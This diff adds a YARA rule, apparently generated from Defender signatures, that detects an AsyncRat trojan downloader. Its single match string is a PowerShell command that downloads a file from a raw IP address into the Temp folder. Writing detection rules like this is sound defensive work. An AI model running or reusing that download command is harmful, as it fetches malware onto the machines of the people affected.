@@ -43,3 +43,24 @@ rule TrojanDownloader_Win64_AsyncRat_CCIQ_2147926487_0
         (all of ($x*))
 }
 
+rule TrojanDownloader_Win64_AsyncRat_CCJU_2147932185_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "TrojanDownloader:Win64/AsyncRat.CCJU!MTB"
+        threat_id = "2147932185"
+        type = "TrojanDownloader"
+        platform = "Win64: Windows 64-bit platform"
+        family = "AsyncRat"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "2"
+        strings_accuracy = "High"
+    strings:
+        $x_2_1 = "powershell(new-object System.Net.WebClient).DownloadFile('http://149.88.66.68/test.mp3','%Temp%/test.bin')" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
